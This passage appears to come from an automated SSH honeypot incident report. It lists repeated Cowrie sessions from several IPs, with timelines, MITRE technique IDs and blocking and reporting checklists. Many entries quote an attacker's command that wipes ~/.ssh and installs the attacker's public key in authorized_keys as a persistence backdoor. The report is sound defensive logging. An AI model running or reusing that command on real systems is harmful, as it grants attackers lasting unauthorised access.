| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:44:40` | `cowrie.session.connect` |
| `2026-04-11 05:44:40` | `cowrie.client.version` |
| `2026-04-11 05:44:40` | `cowrie.client.kex` |
| `2026-04-11 05:44:41` | `cowrie.login.success` |
| `2026-04-11 05:44:42` | `cowrie.session.params` |
| `2026-04-11 05:44:42` | `cowrie.command.input` |
| `2026-04-11 05:44:42` | `cowrie.command.failed` |
| `2026-04-11 05:44:42` | `cowrie.log.closed` |
| `2026-04-11 05:44:42` | `cowrie.session.params` |
| `2026-04-11 05:44:42` | `cowrie.command.input` |
| `2026-04-11 05:44:43` | `cowrie.session.file_download` |
| `2026-04-11 05:44:43` | `cowrie.log.closed` |
| `2026-04-11 05:44:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.245.12[.]182` to AbuseIPDB if not already reported
- [ ] Block `172.245.12[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca69cc34215b

| Field | Detail |
|---|---|
| **Source IP** | `172.245.12[.]182` |
| **First Seen** | 2026-04-11 05:44 |
| **Last Seen** | 2026-04-11 05:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:44:45` | `cowrie.session.connect` |
| `2026-04-11 05:44:45` | `cowrie.client.version` |
| `2026-04-11 05:44:46` | `cowrie.client.kex` |
| `2026-04-11 05:44:46` | `cowrie.login.success` |
| `2026-04-11 05:44:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.245.12[.]182` to AbuseIPDB if not already reported
- [ ] Block `172.245.12[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-803697ec3b99

| Field | Detail |
|---|---|
| **Source IP** | `186.38.26[.]5` |
| **First Seen** | 2026-04-11 05:46 |
| **Last Seen** | 2026-04-11 05:47 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:46:58` | `cowrie.session.connect` |
| `2026-04-11 05:46:58` | `cowrie.client.version` |
| `2026-04-11 05:46:59` | `cowrie.client.kex` |
| `2026-04-11 05:47:00` | `cowrie.login.success` |
| `2026-04-11 05:47:01` | `cowrie.session.params` |
| `2026-04-11 05:47:01` | `cowrie.command.input` |
| `2026-04-11 05:47:01` | `cowrie.command.failed` |
| `2026-04-11 05:47:01` | `cowrie.log.closed` |
| `2026-04-11 05:47:02` | `cowrie.session.params` |
| `2026-04-11 05:47:02` | `cowrie.command.input` |
| `2026-04-11 05:47:02` | `cowrie.session.file_download` |
| `2026-04-11 05:47:02` | `cowrie.log.closed` |
| `2026-04-11 05:47:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.38.26[.]5` to AbuseIPDB if not already reported
- [ ] Block `186.38.26[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de36bfa56522

| Field | Detail |
|---|---|
| **Source IP** | `186.38.26[.]5` |
| **First Seen** | 2026-04-11 05:47 |
| **Last Seen** | 2026-04-11 05:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:47:06` | `cowrie.session.connect` |
| `2026-04-11 05:47:06` | `cowrie.client.version` |
| `2026-04-11 05:47:07` | `cowrie.client.kex` |
| `2026-04-11 05:47:08` | `cowrie.login.success` |
| `2026-04-11 05:47:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.38.26[.]5` to AbuseIPDB if not already reported
- [ ] Block `186.38.26[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7596a15860b

| Field | Detail |
|---|---|
| **Source IP** | `201.49.108[.]245` |
| **First Seen** | 2026-04-11 05:47 |
| **Last Seen** | 2026-04-11 05:47 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:47:30` | `cowrie.session.connect` |
| `2026-04-11 05:47:30` | `cowrie.client.version` |
| `2026-04-11 05:47:30` | `cowrie.client.kex` |
| `2026-04-11 05:47:31` | `cowrie.login.success` |
| `2026-04-11 05:47:32` | `cowrie.session.params` |
| `2026-04-11 05:47:32` | `cowrie.command.input` |
| `2026-04-11 05:47:32` | `cowrie.command.failed` |
| `2026-04-11 05:47:32` | `cowrie.log.closed` |
| `2026-04-11 05:47:33` | `cowrie.session.params` |
| `2026-04-11 05:47:33` | `cowrie.command.input` |
| `2026-04-11 05:47:34` | `cowrie.session.file_download` |
| `2026-04-11 05:47:34` | `cowrie.log.closed` |
| `2026-04-11 05:47:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.49.108[.]245` to AbuseIPDB if not already reported
- [ ] Block `201.49.108[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dc348263a55

| Field | Detail |
|---|---|
| **Source IP** | `201.49.108[.]245` |
| **First Seen** | 2026-04-11 05:47 |
| **Last Seen** | 2026-04-11 05:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:47:37` | `cowrie.session.connect` |
| `2026-04-11 05:47:37` | `cowrie.client.version` |
| `2026-04-11 05:47:38` | `cowrie.client.kex` |
| `2026-04-11 05:47:39` | `cowrie.login.success` |
| `2026-04-11 05:47:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.49.108[.]245` to AbuseIPDB if not already reported
- [ ] Block `201.49.108[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e029e977977e

| Field | Detail |
|---|---|
| **Source IP** | `201.49.108[.]245` |
| **First Seen** | 2026-04-11 05:49 |
| **Last Seen** | 2026-04-11 05:49 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:49:29` | `cowrie.session.connect` |
| `2026-04-11 05:49:29` | `cowrie.client.version` |
| `2026-04-11 05:49:29` | `cowrie.client.kex` |
| `2026-04-11 05:49:31` | `cowrie.login.success` |
| `2026-04-11 05:49:31` | `cowrie.session.params` |
| `2026-04-11 05:49:31` | `cowrie.command.input` |
| `2026-04-11 05:49:31` | `cowrie.command.failed` |
| `2026-04-11 05:49:32` | `cowrie.log.closed` |
| `2026-04-11 05:49:32` | `cowrie.session.params` |
| `2026-04-11 05:49:32` | `cowrie.command.input` |
| `2026-04-11 05:49:33` | `cowrie.session.file_download` |
| `2026-04-11 05:49:33` | `cowrie.log.closed` |
| `2026-04-11 05:49:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.49.108[.]245` to AbuseIPDB if not already reported
- [ ] Block `201.49.108[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-140b152f37ff

| Field | Detail |
|---|---|
| **Source IP** | `201.49.108[.]245` |
| **First Seen** | 2026-04-11 05:49 |
| **Last Seen** | 2026-04-11 05:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:49:37` | `cowrie.session.connect` |
| `2026-04-11 05:49:37` | `cowrie.client.version` |
| `2026-04-11 05:49:37` | `cowrie.client.kex` |
| `2026-04-11 05:49:38` | `cowrie.login.success` |
| `2026-04-11 05:49:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.49.108[.]245` to AbuseIPDB if not already reported
- [ ] Block `201.49.108[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62817f09191c

| Field | Detail |
|---|---|
| **Source IP** | `163.7.9[.]84` |
| **First Seen** | 2026-04-11 05:50 |
| **Last Seen** | 2026-04-11 05:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:50:45` | `cowrie.session.connect` |
| `2026-04-11 05:50:45` | `cowrie.client.version` |
| `2026-04-11 05:50:45` | `cowrie.client.kex` |
| `2026-04-11 05:50:45` | `cowrie.login.success` |
| `2026-04-11 05:50:45` | `cowrie.session.params` |
| `2026-04-11 05:50:45` | `cowrie.command.input` |
| `2026-04-11 05:50:45` | `cowrie.command.failed` |
| `2026-04-11 05:50:45` | `cowrie.log.closed` |
| `2026-04-11 05:50:46` | `cowrie.session.params` |
| `2026-04-11 05:50:46` | `cowrie.command.input` |
| `2026-04-11 05:50:46` | `cowrie.session.file_download` |
| `2026-04-11 05:50:46` | `cowrie.log.closed` |
| `2026-04-11 05:50:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.9[.]84` to AbuseIPDB if not already reported
- [ ] Block `163.7.9[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5575e67986bc

| Field | Detail |
|---|---|
| **Source IP** | `163.7.9[.]84` |
| **First Seen** | 2026-04-11 05:50 |
| **Last Seen** | 2026-04-11 05:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:50:47` | `cowrie.session.connect` |
| `2026-04-11 05:50:47` | `cowrie.client.version` |
| `2026-04-11 05:50:47` | `cowrie.client.kex` |
| `2026-04-11 05:50:48` | `cowrie.login.success` |
| `2026-04-11 05:50:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.9[.]84` to AbuseIPDB if not already reported
- [ ] Block `163.7.9[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d848a812bba

| Field | Detail |
|---|---|
| **Source IP** | `14.103.127[.]232` |
| **First Seen** | 2026-04-11 05:51 |
| **Last Seen** | 2026-04-11 05:51 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:51:16` | `cowrie.session.connect` |
| `2026-04-11 05:51:16` | `cowrie.client.version` |
| `2026-04-11 05:51:16` | `cowrie.client.kex` |
| `2026-04-11 05:51:17` | `cowrie.login.success` |
| `2026-04-11 05:51:17` | `cowrie.session.params` |
| `2026-04-11 05:51:17` | `cowrie.command.input` |
| `2026-04-11 05:51:17` | `cowrie.command.failed` |
| `2026-04-11 05:51:18` | `cowrie.log.closed` |
| `2026-04-11 05:51:18` | `cowrie.session.params` |
| `2026-04-11 05:51:18` | `cowrie.command.input` |
| `2026-04-11 05:51:18` | `cowrie.session.file_download` |
| `2026-04-11 05:51:18` | `cowrie.log.closed` |
| `2026-04-11 05:51:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.127[.]232` to AbuseIPDB if not already reported
- [ ] Block `14.103.127[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db4e75e36f2f

| Field | Detail |
|---|---|
| **Source IP** | `14.103.127[.]232` |
| **First Seen** | 2026-04-11 05:51 |
| **Last Seen** | 2026-04-11 05:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:51:24` | `cowrie.session.connect` |
| `2026-04-11 05:51:24` | `cowrie.client.version` |
| `2026-04-11 05:51:24` | `cowrie.client.kex` |
| `2026-04-11 05:51:25` | `cowrie.login.success` |
| `2026-04-11 05:51:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.127[.]232` to AbuseIPDB if not already reported
- [ ] Block `14.103.127[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16770f0fc857

| Field | Detail |
|---|---|
| **Source IP** | `201.49.108[.]245` |
| **First Seen** | 2026-04-11 05:51 |
| **Last Seen** | 2026-04-11 05:51 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:51:27` | `cowrie.session.connect` |
| `2026-04-11 05:51:27` | `cowrie.client.version` |
| `2026-04-11 05:51:27` | `cowrie.client.kex` |
| `2026-04-11 05:51:28` | `cowrie.login.success` |
| `2026-04-11 05:51:29` | `cowrie.session.params` |
| `2026-04-11 05:51:29` | `cowrie.command.input` |
| `2026-04-11 05:51:29` | `cowrie.command.failed` |
| `2026-04-11 05:51:29` | `cowrie.log.closed` |
| `2026-04-11 05:51:30` | `cowrie.session.params` |
| `2026-04-11 05:51:30` | `cowrie.command.input` |
| `2026-04-11 05:51:30` | `cowrie.session.file_download` |
| `2026-04-11 05:51:30` | `cowrie.log.closed` |
| `2026-04-11 05:51:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.49.108[.]245` to AbuseIPDB if not already reported
- [ ] Block `201.49.108[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b635764100cd

| Field | Detail |
|---|---|
| **Source IP** | `201.49.108[.]245` |
| **First Seen** | 2026-04-11 05:51 |
| **Last Seen** | 2026-04-11 05:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:51:34` | `cowrie.session.connect` |
| `2026-04-11 05:51:34` | `cowrie.client.version` |
| `2026-04-11 05:51:35` | `cowrie.client.kex` |
| `2026-04-11 05:51:36` | `cowrie.login.success` |
| `2026-04-11 05:51:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.49.108[.]245` to AbuseIPDB if not already reported
- [ ] Block `201.49.108[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e70553f3e79a

| Field | Detail |
|---|---|
| **Source IP** | `201.49.108[.]245` |
| **First Seen** | 2026-04-11 05:53 |
| **Last Seen** | 2026-04-11 05:53 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:53:28` | `cowrie.session.connect` |
| `2026-04-11 05:53:28` | `cowrie.client.version` |
| `2026-04-11 05:53:28` | `cowrie.client.kex` |
| `2026-04-11 05:53:29` | `cowrie.login.success` |
| `2026-04-11 05:53:30` | `cowrie.session.params` |
| `2026-04-11 05:53:30` | `cowrie.command.input` |
| `2026-04-11 05:53:30` | `cowrie.command.failed` |
| `2026-04-11 05:53:30` | `cowrie.log.closed` |
| `2026-04-11 05:53:31` | `cowrie.session.params` |
| `2026-04-11 05:53:31` | `cowrie.command.input` |
| `2026-04-11 05:53:31` | `cowrie.session.file_download` |
| `2026-04-11 05:53:31` | `cowrie.log.closed` |
| `2026-04-11 05:53:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.49.108[.]245` to AbuseIPDB if not already reported
- [ ] Block `201.49.108[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-580a308b972b

| Field | Detail |
|---|---|
| **Source IP** | `201.49.108[.]245` |
| **First Seen** | 2026-04-11 05:53 |
| **Last Seen** | 2026-04-11 05:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:53:35` | `cowrie.session.connect` |
| `2026-04-11 05:53:35` | `cowrie.client.version` |
| `2026-04-11 05:53:35` | `cowrie.client.kex` |
| `2026-04-11 05:53:37` | `cowrie.login.success` |
| `2026-04-11 05:53:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.49.108[.]245` to AbuseIPDB if not already reported
- [ ] Block `201.49.108[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0251c697ef97

| Field | Detail |
|---|---|
| **Source IP** | `43.165.185[.]71` |
| **First Seen** | 2026-04-11 05:54 |
| **Last Seen** | 2026-04-11 05:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:54:33` | `cowrie.session.connect` |
| `2026-04-11 05:54:33` | `cowrie.client.version` |
| `2026-04-11 05:54:34` | `cowrie.client.kex` |
| `2026-04-11 05:54:34` | `cowrie.login.success` |
| `2026-04-11 05:54:34` | `cowrie.session.params` |
| `2026-04-11 05:54:34` | `cowrie.command.input` |
